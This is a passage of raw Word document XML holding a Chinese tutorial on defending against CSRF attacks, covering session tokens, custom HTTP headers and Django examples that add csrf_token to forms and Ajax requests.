        <w:t xml:space="preserve"> session </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>之中，然后在每次请求时把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从</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> session </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中拿出，与请求中的</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进行比对，但这种方法的难点在于如何把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以参数的形式加入请求。对于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> GET </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求，</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">token </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将附在请求地址之后，这样</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就变成</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://url?csrftoken=tokenvalue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而对于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> POST </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求来说，要在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> form </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的最后加上</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;input type=”hidden” name=”csrftoken” value=”tokenvalue”/&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，这样就把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以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上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是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> javascript </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>遍历整个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> dom </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>树，对于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> dom </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> form </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签后加入</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。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> html </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代码，这种方法就没有作用，还需要程序员在编码时手动添加</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D08D75" w14:textId="0FDE77CA" w:rsidR="003714A9"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该方法还有一个缺点是难以保证</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本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上</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，黑客可以在自己的网站上得到这个</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，并马上就可以发动</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攻击。为了避免这一点，系统可以在添加</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的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加</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，如果是通向外网则不加。不过，即使这个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> csrftoken </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不以参数的形式附加在请求之中，黑客的网站也同样可以通过</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来得到这个</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值以发动</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攻击。这也是一些用户喜欢手动关闭浏览器</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功能的原因。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DD9DEF" w14:textId="77777777" w:rsidR="00D8288D"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shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>）在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>头中自定义属性并验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15303E06" w14:textId="59DDB109" w:rsidR="00870C85" w:rsidRPr="000A3629"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这种方法也是使用</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并进行验证，和上一种方法不同的是，这里并不是把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以参数的形式置于</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请求之中，而是把它放到</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头中自定义的属性里。通过</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> XMLHttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个类，可以一次性给所有该类请求加上</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> csrftoken </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个</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头属性，并把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值放入其中。这样解决了上种方法在请求中加入</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的不便，同时，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> XMLHttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求的地址不会被记录到浏览器的地址栏，也不用担心</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会透过</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泄露到其他网站中去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C83921"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在form表单中应用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4495B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shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;form action=</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 xml:space="preserve"> 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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343112C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shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A95EA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shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;p&gt;用户名：&lt;input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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A07BF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&lt;p&gt;密码：&lt;input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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C08A0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&lt;p&gt;&lt;input type=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"submit"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397BD31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&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5EA539" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00F1769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F17699">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在Ajax中应用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF5638E" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00F1769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F17699">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>放在data里：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F9355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&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A806D6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 lang=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"en"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF2BD2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1A4E35E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&lt;meta charset=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"UTF-8"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4576275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&lt;script src=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"/static/jquery-3.3.1.js"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CF572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&lt;title&gt;Title&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4FF96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50204DD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025643D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 action=</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 xml:space="preserve"> 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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42762F3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 csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFDC76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&lt;p&gt;用户名：&lt;input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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D72E9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&lt;p&gt;密码：&lt;input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xml:space="preserve"> id=</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&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E22C92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&lt;p&gt;&lt;input type=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"submit"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278B611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&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29178DB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&lt;button </w:t>
      </w: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&gt;点我&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A546D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6A9C061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7EA1911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).click(function () {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1748142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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433A965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url: </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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A6E7A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type: </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p>
    <w:p w14:paraId="53115C7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data: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C150B8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'[name="name"]'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).val(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E694DF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).val(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E178A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shd w:val="clear" w:color="auto" w:fill="00FFFF"/>
        </w:rPr>
        <w:t>'csrfmiddlewaretoken'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="00FFFF"/>
        </w:rPr>
        <w:t>: $(</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="00FFFF"/>
        </w:rPr>
        <w:t>'[name="csrfmiddlewaretoken"]'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="00FFFF"/>
        </w:rPr>
        <w:t>).val()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDDF8F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0AA5810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success: function (data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A53230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console.log(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3273ED0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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245920C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0A4C2A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270AE60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682882F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7534724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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7810EB00"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放在</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里：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C145DB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获取</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document.cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745BA239"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是一个字符串，可以自己用</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>切割，也可以用</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jquery</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的插件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6B4AC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获取</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$.cookie('csrftoken')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011FDD9B"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设置</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$.cookie('key','value')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8530C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&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AD990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 lang=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"en"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD4E9E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2F1E118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&lt;meta charset=</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
